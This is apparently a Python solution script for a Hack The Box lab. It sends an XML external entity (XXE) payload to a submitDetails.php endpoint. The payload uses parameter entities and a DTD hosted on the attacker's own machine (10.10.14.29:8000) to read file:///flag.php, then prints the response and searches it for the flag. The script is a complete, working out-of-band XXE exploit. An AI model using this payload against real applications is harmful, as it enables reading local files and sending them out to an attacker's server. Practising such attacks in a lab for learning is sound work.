import requests
import re

IP = "10.129.144.35"
url = f"http://{IP}"

session = requests.Session()

# our ip = 10.10.14.29
# 34.149.204.188
xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///flag.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://10.10.14.29:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
<root>
<name>first</name>
<tel>3452343456</tel>
<email>&joined;</email>
<message>Comment</message>
</root>
"""

r = session.post(url + '/submitDetails.php', data=xml)
flagRgx = re.compile(r'HTB\{.*\}')
flag = flagRgx.search(r.text)
print(r.text)
# print(flag.group())